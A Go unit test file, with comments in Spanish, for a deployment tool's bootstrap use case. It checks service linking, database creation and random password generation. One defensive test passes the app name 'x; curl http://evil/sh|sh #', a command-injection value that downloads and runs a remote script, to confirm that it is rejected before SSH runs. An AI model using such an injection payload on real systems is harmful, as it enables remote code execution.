package usecases

import (
	"testing"

	"github.com/Dall06/tarhiata-ops/srv/sys/domain"
	"github.com/Dall06/tarhiata-ops/srv/sys/ports"
	"github.com/Dall06/tarhiata-ops/srv/sys/tests/mocks"
)

func TestBootstrapMasterService_Execute(t *testing.T) {
	repo := mocks.NewMockConfigRepository()
	repo.Config = &domain.ServerConfig{Host: "127.0.0.1"}
	sshExec := mocks.NewMockSSHExecutor()

	// 1. Configurar un enlace previo para api-shop -> old-db
	if err := repo.SaveServiceLink(domain.ServiceLink{
		SourceSvc:  "api-shop",
		TargetSvc:  "old-db",
		EnvVarName: "DATABASE_URL",
	}); err != nil {
		t.Fatalf("unexpected error saving service link: %v", err)
	}

	linkUC := NewLinkServicesUseCase(repo, sshExec)
	unlinkUC := NewUnlinkServicesUseCase(repo, sshExec)
	dbUC := NewDeployDatabaseUseCase(sshExec)
	svcUC := NewDeployServiceUseCase(sshExec)

	bootstrapUC := NewBootstrapMasterServiceUseCase(repo, sshExec, linkUC, unlinkUC, dbUC, svcUC)

	input := ports.BootstrapMasterInput{
		AppName:      "api-shop",
		Image:        "node:18-alpine",
		Port:         8080,
		Domain:       "shop.tarhiata.local",
		ExposePublic: true,
		DBEngine:     "postgres",
		EnvVarName:   "DATABASE_URL",
	}

	config := domain.ServerConfig{Host: "127.0.0.1"}

	res, err := bootstrapUC.Execute(input, config)
	if err != nil {
		t.Fatalf("Se esperaba éxito en BootstrapMasterService, error: %v", err)
	}

	// Verificar desacople automático de la BD vieja
	if len(res.UnlinkedOld) != 1 || res.UnlinkedOld[0] != "old-db" {
		t.Errorf("Se esperaba desvincular 'old-db', se desvinculó: %v", res.UnlinkedOld)
	}

	// Verificar creación de nueva App
	if res.App.Name != "api-shop" {
		t.Errorf("Nombre de app esperado 'api-shop', obtenido '%s'", res.App.Name)
	}

	// Verificar creación de nueva DB
	if res.Database == nil || res.Database.Engine != "postgres" {
		t.Fatalf("Se esperaba creación de base de datos postgres")
	}

	// Verificar auto-link inyectado
	if res.Link == nil || res.Link.TargetSvc != "postgres-api-shop" {
		t.Errorf("Link objetivo esperado 'postgres-api-shop', obtenido '%v'", res.Link)
	}

	// La contraseña de la BD ya no debe ser el valor estático histórico, y debe
	// coincidir con la que efectivamente quedó guardada en el catálogo.
	if res.Database.Password == "secretpass123" || res.Database.Password == "" {
		t.Errorf("se esperaba una contraseña generada, no estática/vacía, obtenida: %q", res.Database.Password)
	}
	saved, err := repo.GetDatabase(res.Database.Name)
	if err != nil || saved == nil {
		t.Fatalf("no se encontró la base de datos guardada: %v", err)
	}
	if saved.Password != res.Database.Password {
		t.Errorf("la contraseña guardada (%q) no coincide con la desplegada (%q)", saved.Password, res.Database.Password)
	}
}

// TestBootstrapMasterService_RejectsInvalidAppName valida que un AppName con
// metacaracteres de shell se rechace ANTES de tocar SSH (raíz del problema),
// en vez de dejar que se propague a los comandos remotos de despliegue.
func TestBootstrapMasterService_RejectsInvalidAppName(t *testing.T) {
	repo := mocks.NewMockConfigRepository()
	sshExec := mocks.NewMockSSHExecutor()

	linkUC := NewLinkServicesUseCase(repo, sshExec)
	unlinkUC := NewUnlinkServicesUseCase(repo, sshExec)
	dbUC := NewDeployDatabaseUseCase(sshExec)
	svcUC := NewDeployServiceUseCase(sshExec)
	bootstrapUC := NewBootstrapMasterServiceUseCase(repo, sshExec, linkUC, unlinkUC, dbUC, svcUC)

	input := ports.BootstrapMasterInput{
		AppName: "x; curl http://evil/sh|sh #",
		Image:   "node:18-alpine",
		Port:    8080,
	}

	if _, err := bootstrapUC.Execute(input, domain.ServerConfig{Host: "127.0.0.1"}); err == nil {
		t.Fatal("se esperaba error por AppName inválido, no se rechazó")
	}
	if len(sshExec.CommandsExecuted) != 0 {
		t.Errorf("no debió ejecutarse ningún comando SSH antes de validar AppName, se ejecutaron: %v", sshExec.CommandsExecuted)
	}
}

// TestGenerateDBPassword_IsRandomAndUnique valida que cada llamada produzca una
// contraseña distinta (no un valor fijo compartido entre despliegues).
func TestGenerateDBPassword_IsRandomAndUnique(t *testing.T) {
	p1, err := generateDBPassword()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	p2, err := generateDBPassword()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if p1 == "" || p2 == "" {
		t.Fatal("se esperaban contraseñas no vacías")
	}
	if p1 == p2 {
		t.Errorf("se esperaban contraseñas distintas entre llamadas, ambas fueron %q", p1)
	}
}
